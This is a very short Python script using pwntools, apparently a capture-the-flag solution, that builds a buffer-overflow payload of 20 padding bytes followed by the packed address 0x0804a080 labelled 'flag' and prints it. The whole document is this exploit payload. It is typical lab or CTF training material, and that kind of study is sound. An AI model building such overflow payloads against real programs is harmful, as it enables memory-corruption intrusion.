from pwn import *

flag = 0x0804a080

buf = ""
buf += "A" * 20
buf += p32(flag)

print buf
